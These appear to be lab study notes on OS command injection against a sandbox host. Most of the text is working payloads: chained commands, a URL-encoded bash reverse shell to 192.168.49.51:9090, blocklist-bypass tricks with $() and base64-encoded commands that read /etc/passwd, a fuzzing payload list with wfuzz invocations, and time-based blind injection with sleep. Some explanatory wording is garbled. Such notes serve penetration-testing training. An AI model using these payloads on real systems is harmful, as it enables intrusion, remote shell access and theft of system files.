#### Command Injection

In the case of Linux, we can use the semicolon (;), the logical AND (&&), the logical OR (||), and even a single pipe character (|).

```
ls -ls; id

```
We can also use && to chain commands. In this case the second command will only run if the first exits without error
A logical OR (||) will only run the second command if the first fails.

 Linux-specific inline execution1 mechanisms. Considers these examples, which use the backtick (`) character and the $() null statement to "wrap" a command ("cmd")

http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;whoami

http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|cat%20/var/tmp/exercise_chaining_flag.txt

#### Input Normalization

```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'

curl "http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.51/9090+0>%261'"

```
#### Input Sanitization - Blocklisted Strings Bypass

Command substitution:

echo "I am `whoami` here"

echo "I am $(whoami) here"

A Null Statement Injection Bypass:

wh$()oami
n$()c -n$()lvp 9090

```

http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;wh$()oami 

```

#### Custom command list
```
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```
Commands:

```
wfuzz -c -z file,/home/kali/command_injection_custom.txt --hc 404 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ

wfuzz -c -z file,/home/kali/command_injection_custom.txt --hc 404 --hh 1156 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ


```

```
echo "cat /etc/passwd" |base64

http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`

```

#### Input Sanitization - Blocklisted Strings Bypass

```
time curl http://ci-sandbox:80/php/blind.php?ip=127.0.0.1

time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"

```

